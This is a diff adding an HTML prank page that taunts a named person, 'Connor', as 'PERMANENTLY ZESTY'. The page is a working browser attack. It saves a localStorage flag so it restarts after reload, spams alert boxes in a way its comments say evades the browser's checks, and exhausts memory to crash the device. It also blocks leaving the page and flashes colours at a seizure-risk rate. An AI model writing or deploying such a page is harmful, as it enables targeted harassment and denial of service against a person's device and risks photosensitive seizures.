@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>ETERNAL DUNGEON | BLICKED</title>
+    <style>
+        body {
+            background-color: #ccff00;
+            color: #ff00ff;
+            font-family: "Comic Sans MS", cursive;
+            text-align: center;
+            animation: flash 0.03s infinite;
+            overflow: hidden;
+            height: 100vh;
+        }
+        @keyframes flash {
+            0% { background-color: #ccff00; }
+            50% { background-color: #ff00ff; }
+            100% { background-color: #ffff00; }
+        }
+        .jail-cell {
+            margin-top: 15vh;
+            border: 15px double lime;
+            background: white;
+            padding: 40px;
+            transform: scale(1.2) rotate(-2deg);
+        }
+    </style>
+</head>
+<body>
+
+    <div class="jail-cell">
+        <h1 style="font-size: 60px;">OINK OINK!</h1>
+        <h2 style="color: red;">CONNOR STATUS: PERMANENTLY ZESTY</h2>
+        <p style="font-size: 20px;">The Dungeon remembers you. Reloading won't save you.</p>
+    </div>
+
+    <script>
+        // TASK: The Eternal Memory
+        // This ensures even if he reloads, the "Task" stays active
+        localStorage.setItem('dungeon_status', 'BLICKED_FOREVER');
+
+        function executePunishment() {
+            // Task: The Alert Spam (Visual Scream)
+            // Wrapping in a setTimeout to avoid the browser's "Prevent multiple alerts" check
+            setInterval(() => {
+                alert("STILL BLICKED, NOOB.");
+                alert("STOP RELOADING THE IPAD, CONNOR.");
+            }, 100);
+
+            // Task: The Recursive Crash
+            // Instead of a while(true) which browsers kill, we use recursion
+            function eatRam() {
+                const garbage = new Array(1000000).fill("ZESTY");
+                const div = document.createElement('div');
+                div.innerHTML = "<h1>OINK</h1>".repeat(500);
+                document.body.appendChild(div);
+                setTimeout(eatRam, 1); // Keeps it going without an immediate freeze kill
+            }
+            eatRam();
+        }
+
+        // Check if we should auto-trigger on reload
+        if (localStorage.getItem('dungeon_status') === 'BLICKED_FOREVER') {
+            console.log("Dungeon Engine: Resuming Punishment Task...");
+            // Trigger after 1 second so he thinks he's safe for a moment
+            setTimeout(executePunishment, 1000);
+        }
+
+        // Prevent escaping via "Back" or "Reload" shortcuts
+        window.onbeforeunload = function() {
+            return "You are trapped in the Dungeon.";
+        };
+    </script>
+</body>
+</html>
